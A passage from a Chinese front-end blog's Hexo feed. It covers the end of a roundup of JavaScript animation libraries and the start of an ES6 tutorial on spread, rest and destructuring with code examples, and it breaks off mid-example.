animate.css，所以它支持 animate.css 多达 60 多种的动画效果，可以改变动画设置喜欢的风格、延迟、长度、偏移和迭代等，能满足各种需求。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881012619-0815f141-f9ef-4d9e-bdb1-4f42e96a85bc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881012619-0815f141-f9ef-4d9e-bdb1-4f42e96a85bc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="o61TN"></a></p><h1 id="AniJS"><a href="#AniJS" class="headerlink" title="AniJS"></a>AniJS</h1><p>AniJS 允许我们为网站创建动画样式，而无需任何 JavaScript 或 CSS 编码！ 您可以使用简单的<strong>If</strong> - <strong>On</strong> - <strong>Do</strong> - <strong>To</strong>语法用 HTML 指定所有动画<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881180295-960b17ec-1a1e-41ec-880b-223d8173a45d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881180295-960b17ec-1a1e-41ec-880b-223d8173a45d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="is0DJ"></a></p><h1 id="Anime-js"><a href="#Anime-js" class="headerlink" title="Anime.js"></a>Anime.js</h1><p>Anime.js 是一个轻量的 JavaScript 动画库， 拥有简单而强大的 API。可对 CSS 属性、 SVG、 DOM 和 JavaScript 对象进行动画。它很轻便，gzip 压缩完只有 9kb 左右。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881400291-d7ddd8b0-062d-4ede-8a58-48d1148fc89b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881400291-d7ddd8b0-062d-4ede-8a58-48d1148fc89b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="uxMR2"></a></p><h1 id="Typed-js"><a href="#Typed-js" class="headerlink" title="Typed.js"></a>Typed.js</h1><p>typed.js 是一个类型化库，效果是用打字机的方式显示一段话，可以自定义任何字符串、指定显示速度、指定是否循环等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643881755659-578bbdfb-421c-469a-8e9a-b14afdaf932b.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643881755659-578bbdfb-421c-469a-8e9a-b14afdaf932b.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="RtNic"></a></p><h1 id="Vivus"><a href="#Vivus" class="headerlink" title="Vivus"></a>Vivus</h1><p>Vivus 是一个轻量级的 JavaScript 库（没有依赖项），它允许我们对 SVG 进行动画处理，使它们看起来像是被绘制的。它有多种不同的动画可用，以及创建自定义脚本的选项，以喜欢的任何方式绘制 SVG。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881836944-f040f549-034b-4f94-a8ae-f20b9fd9b6d7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881836944-f040f549-034b-4f94-a8ae-f20b9fd9b6d7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="pEZse"></a></p><h1 id="Popmotion"><a href="#Popmotion" class="headerlink" title="Popmotion"></a>Popmotion</h1><p>Popmotion 是一个只有 12KB 的 JavaScript 运动引擎，可以用来实现动画，物理效果和输入跟踪。原生的 DOM 支持：CSS，SVG，SVG 路径和 DOM 属性的支持，开箱即用。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881986801-afdd8037-d86f-444f-9419-0a0d24f8e864.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643881986801-afdd8037-d86f-444f-9419-0a0d24f8e864.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="un8xH"></a></p><h1 id="Granim-js"><a href="#Granim-js" class="headerlink" title="Granim.js"></a>Granim.js</h1><p>granim.js 是一个在网页中创建流畅的交互式流体动画的小型 JavaScript 库，granim.js 可以实现各种想要的渐变的动画效果，使网页色彩更加丰富，视觉效果更佳！<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882236367-0849eaa1-13f6-48fe-b24e-dae0899e1e29.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882236367-0849eaa1-13f6-48fe-b24e-dae0899e1e29.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Klkao"></a></p><h1 id="Kute-js"><a href="#Kute-js" class="headerlink" title="Kute.js"></a>Kute.js</h1><p>Kute.js 是一个原生的 Javascript 动画引擎，具有优秀的性能和模块化的代码。 它提供了一大堆工具，以帮助创建自定义动画。它提供了易于使用的方法来设置高性能、跨浏览器的动画。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882340536-aef0dbd9-af05-4f6f-af2b-4ef464551781.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882340536-aef0dbd9-af05-4f6f-af2b-4ef464551781.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="vXxCT"></a></p><h1 id="Simple-Parallax"><a href="#Simple-Parallax" class="headerlink" title="Simple Parallax"></a>Simple Parallax</h1><p>simpleParallax.js 是一个非常简单且小巧的 Vanilla JS 库，可在任何图像上添加视差动画。它因其易用性和可视化渲染而脱颖而出。视差效果直接应用于图像标签，无需使用背景图像。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882513364-7682c188-5167-4992-a0a8-f5db2754b31c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882513364-7682c188-5167-4992-a0a8-f5db2754b31c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="PWsjk"></a></p><h1 id="Barba-js"><a href="#Barba-js" class="headerlink" title="Barba.js"></a>Barba.js</h1><p>Barba.js 是一个小（4kb 的压缩和压缩），灵活和无依赖的库，可以帮助您创建流畅和平滑的过渡网站的页面。 它可以减少页面之间的延迟，最大限度地减少浏览器 HTTP 请求并增强用户的 Web 体验。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882962879-d2852eea-27fe-4b78-a603-7d8e90eb01cd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643882962879-d2852eea-27fe-4b78-a603-7d8e90eb01cd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ef9oD"></a></p><h1 id="mo-js"><a href="#mo-js" class="headerlink" title="mo.js"></a>mo.js</h1><p>Mo.js 是一个简洁、高效的图形动画库，拥有流畅的动画和惊人的用户体验，在任何设备上，屏幕密度独立的效果都很好，可以绘制内置的形状或者自定义形状，还可以绘制多个动画，再让它们串联在一起。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643883159339-05c308ba-8dd2-434e-ba44-eb140943be36.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643883159339-05c308ba-8dd2-434e-ba44-eb140943be36.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="h7kd5"></a></p><h1 id="Particles-js"><a href="#Particles-js" class="headerlink" title="Particles.js"></a>Particles.js</h1><p>Particles.js 一个轻量级的 JavaScript 库，用来在网页上创建颗粒效果。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643883928603-4d5f3db8-5cb3-427f-8886-0b8489dca50c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643883928603-4d5f3db8-5cb3-427f-8886-0b8489dca50c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ifwc5"></a></p><h1 id="tsParticles"><a href="#tsParticles" class="headerlink" title="tsParticles"></a>tsParticles</h1><p>tsParticles 可以轻松创建高度可定制的粒子动画并将它们用作网站的动画背景。可用于 React.js、Vue.js（2.x 和 3.x）、Angular、Svelte、jQuery、Preact、Inferno、Solid、Riot 和 Web 组件的现成可用组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643884168246-4419bbf9-0987-4791-8112-6ea30149d884.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643884168246-4419bbf9-0987-4791-8112-6ea30149d884.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="NFmxd"></a></p><h1 id="Rough-Notation"><a href="#Rough-Notation" class="headerlink" title="Rough Notation"></a>Rough Notation</h1><p>Rough Notation 是一个小型 JavaScript 库，用于在网页上创建和动画注释。它使用 RoughJS 创建手绘的外观和感觉。元素可以用多种不同的样式进行注释。动画持续时间可以配置，或者只是关闭。压缩后的大小仅 3.83kb。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643884317111-7c264d54-b4d2-42a3-aeb4-7f62dd42cd78.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643884317111-7c264d54-b4d2-42a3-aeb4-7f62dd42cd78.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="d7wV6"></a></p><h1 id="Animate-on-Scroll"><a href="#Animate-on-Scroll" class="headerlink" title="Animate on Scroll"></a>Animate on Scroll</h1><p>Animate on Scroll 是一个在页面时创建动画的 JavaScript 动画库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643884596967-b53dc332-fab0-4580-82d6-fae24ddec22d.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1643884596967-b53dc332-fab0-4580-82d6-fae24ddec22d.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="bGCX6"></a></p><h1 id="Framer-Motion"><a href="#Framer-Motion" class="headerlink" title="Framer Motion"></a>Framer Motion</h1><p>Motion 是 Framer 的 React 的生产就绪运动库。它带来了声明性动画、轻松的布局转换和手势，同时保持了 HTML 和 SVG 语义。Motion 使用强大的手势识别器扩展了 React 的事件系统。它支持悬停、点击、平移和拖动。注意，Motion 需要 React 16.8 或更高版本。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1644295728196-2fb91e5e-841c-4a12-a408-4a157e21ecef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1644295728196-2fb91e5e-841c-4a12-a408-4a157e21ecef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ROnvv"></a></p><h1 id="React-Motion"><a href="#React-Motion" class="headerlink" title="React Motion"></a>React Motion</h1><p>React Motion 是一个用于 React 应用程序的动画库，可以轻松创建和实现逼真的动画。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1644296500821-54b8f275-632d-48b4-af76-957aa1c92e88.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1644296500821-54b8f275-632d-48b4-af76-957aa1c92e88.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 动画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6新特性</title>
      <link href="/2019/02/24/frontend/interview/es6-xin-te-xing/"/>
      <url>/2019/02/24/frontend/interview/es6-xin-te-xing/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="Wx6je"></a></p><h1 id="展开运算符和剩余运算符"><a href="#展开运算符和剩余运算符" class="headerlink" title="展开运算符和剩余运算符"></a>展开运算符和剩余运算符</h1><p><a name="LahyN"></a></p><h2 id="展开运算符"><a href="#展开运算符" class="headerlink" title="展开运算符"></a>展开运算符</h2><p>**展开语法,**可以在函数调用&#x2F;数组构造时, 将数组表达式或者 string 在语法层面展开；还可以在构造字面量对象时, 将对象表达式按 key-value 的方式展开。(字面量一般指 [1, 2, 3] 或者 {name: “mdn”} 这种简洁的构造方式)</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y, z</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y + z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(...numbers));<span class="comment">//6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sum.<span class="title function_">apply</span>(<span class="literal">null</span>, numbers));<span class="comment">//6</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="ghlNZ"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="QGAKj"></a></p><h3 id="等价于-apply-的方式"><a href="#等价于-apply-的方式" class="headerlink" title="等价于 apply 的方式"></a>等价于 apply 的方式</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">myFunction.<span class="title function_">apply</span>(<span class="literal">null</span>, args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="title function_">myFunction</span>(...args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">v, w, x, y, z</span>) &#123; &#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>];</span><br><span class="line"><span class="title function_">myFunction</span>(-<span class="number">1</span>, ...args, <span class="number">2</span>, ...[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p><a name="UubqH"></a></p><h3 id="数组拷贝-copy）浅拷贝"><a href="#数组拷贝-copy）浅拷贝" class="headerlink" title="数组拷贝(copy）浅拷贝"></a>数组拷贝(copy）浅拷贝</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [...arr]; <span class="comment">// like arr.slice()</span></span><br><span class="line">arr2.<span class="title function_">push</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// arr2 此时变成 [1, 2, 3, 4]</span></span><br><span class="line"><span class="comment">// arr 不受影响</span></span><br></pre></td></tr></table></figure><p><a name="jHKuE"></a></p><h3 id="连接多个数组"><a href="#连接多个数组" class="headerlink" title="连接多个数组"></a>连接多个数组</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 将 arr2 中所有元素附加到 arr1 后面并返回</span></span><br><span class="line"><span class="keyword">var</span> arr3 = arr1.<span class="title function_">concat</span>(arr2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr3 = [...arr1, ...arr2];</span><br></pre></td></tr></table></figure><p><a name="kMGW4"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><a name="NdZfB"></a></p><h3 id="操作对象"><a href="#操作对象" class="headerlink" title="操作对象"></a>操作对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;<span class="attr">id</span>:<span class="string">&#x27;1&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;...obj&#125; <span class="comment">//&#123;id: &#x27;1&#x27;, name: &#x27;张三&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj2=&#123;<span class="attr">type</span>:<span class="string">&#x27;annimal&#x27;</span>,<span class="attr">lang</span>:<span class="string">&#x27;js&#x27;</span>, <span class="attr">sex</span>:<span class="string">&#x27;man&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj,&#123;...obj2&#125;</span><br><span class="line"><span class="comment">//&#123;id: &#x27;1&#x27;, name: &#x27;张三&#x27;, type: &#x27;annimal&#x27;, lang: &#x27;js&#x27;, sex:&#x27;man&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><a name="ajqzu"></a></p><h2 id="剩余操作符"><a href="#剩余操作符" class="headerlink" title="剩余操作符"></a>剩余操作符</h2><p><strong>剩余参数</strong>语法允许我们将一个不定数量的参数表示为<strong>一个数组。</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun1</span>(<span class="params">...theArgs</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(theArgs.<span class="property">length</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun1</span>();  <span class="comment">// 弹出 &quot;0&quot;, 因为theArgs没有元素</span></span><br><span class="line"><span class="title function_">fun1</span>(<span class="number">5</span>); <span class="comment">// 弹出 &quot;1&quot;, 因为theArgs只有一个元素</span></span><br><span class="line"><span class="title function_">fun1</span>(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>); <span class="comment">// 弹出 &quot;3&quot;, 因为theArgs有三个元素</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">a,b,...arr</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">//1</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);<span class="comment">//1</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr);<span class="comment">//[ 3, 4 ]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="yJxLj"></a></p><h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p>解构赋值是对赋值运算符的扩展。<br />他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值。<br />在代码书写上简洁且易读，语义更加清晰明了；也方便了复杂对象中数据字段获取。</p><p><a name="mfqd0"></a></p><h2 id="数组模型的解构"><a href="#数组模型的解构" class="headerlink" title="数组模型的解构"></a>数组模型的解构</h2><p><a name="YzvVM"></a></p><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 2</span></span><br><span class="line"><span class="comment">// c = 3</span></span><br></pre></td></tr></table></figure><p><a name="XTzbx"></a></p><h3 id="可嵌套"><a href="#可嵌套" class="headerlink" title="可嵌套"></a>可嵌套</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, [[b], c]] = [<span class="number">1</span>, [[<span class="number">2</span>], <span class="number">3</span>]];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 2</span></span><br><span class="line"><span class="comment">// c = 3</span></span><br></pre></td></tr></table></figure><p><a name="ggpaM"></a></p><h3 id="可忽略"><a href="#可忽略" class="headerlink" title="可忽略"></a>可忽略</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, , b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// a = 1</span></span><br><span class="line"><span class="comment">// b = 3</span></span><br></pre></td></tr></table></figure><p><a name="ENMyt"></a></p><h3 id="不完全解构"><a href="#不完全解构" class="headerlink" title="不完全解构"></a>不完全解构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a = <span class="number">1</span>, b] = []; <span class="comment">// a = 1, b = undefined</span></span><br></pre></td></tr></table></figure><p><a name="aOlg8"></a></p><h3 id="剩余运算符"><a href="#剩余运算符" class="headerlink" title="剩余运算符"></a>剩余运算符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, ...b] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">//a = 1</span></span><br><span class="line"><span class="comment">//b = [2, 3]</span></span><br></pre></td></tr></table></figure><p><a name="MwtAH"></a></p><h3 id="字符串等"><a href="#字符串等" class="headerlink" title="字符串等"></a>字符串等</h3><p>在数组的解构中，解构的目标若为可遍历对象，皆可进行解构赋值。可遍历对象即实现 Iterator 接口的数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">// a = &#x27;h&#x27;</span></span><br><span class="line"><span class="comment">// b = &#x27;e&#x27;</span></span><br><span class="line"><span class="comment">// c = &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">// d = &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">// e = &#x27;o&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="yaEro"></a></p><h3 id="解构默认值"><a href="#解构默认值" class="headerlink" title="解构默认值"></a>解构默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 